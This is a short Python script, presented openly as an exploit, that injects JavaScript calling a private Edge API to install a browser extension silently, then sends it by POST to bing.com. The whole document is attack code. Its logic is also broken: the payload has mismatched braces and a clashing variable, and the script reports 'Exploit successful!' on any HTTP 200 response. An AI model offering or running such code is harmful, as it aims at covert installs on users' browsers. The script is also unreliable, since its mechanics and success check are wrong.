import requests

def exploit_edge_vulnerability(target_url, extension_id):
    try:
        # Injecting JavaScript snippet to install extension silently
        script = """
        function injectScript() {
            const scriptElement = document.createElement("script");
            script = `manifest = {TARGET_EXTENSION_MANIFEST}
            };
            x = JSON.stringify(manifest);
            chrome.edgeMarketingPagePrivate.installTheme(
                "{EXTENSION_ID}",
                x,
                console.log
            );`;
            scriptElement.src = "data:application/javascript;charset=utf-8;base64," + btoa(unescape(encodeURIComponent(script)));
            document.body.appendChild(scriptElement);
        }
        injectScript();
        """
        
        # Replace placeholders with actual values
        script = script.replace("{TARGET_EXTENSION_MANIFEST}", '{"name": "Edge Exploit Extension","version": "1.0"}')
        script = script.replace("{EXTENSION_ID}", extension_id)
        
        # Sending a POST request to target URL with injected script
        response = requests.post(target_url, data={"script": script})
        
        if response.status_code == 200:
            print("Exploit successful! Extension installed.")
        else:
            print(f"Exploit failed with status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred: {str(e)}")

if __name__ == "__main__":
    # Provide the target URL and extension ID
    target_url = "http://bing.com"
    extension_id = "your_extension_id_here"
    exploit_edge_vulnerability(target_url, extension_id)
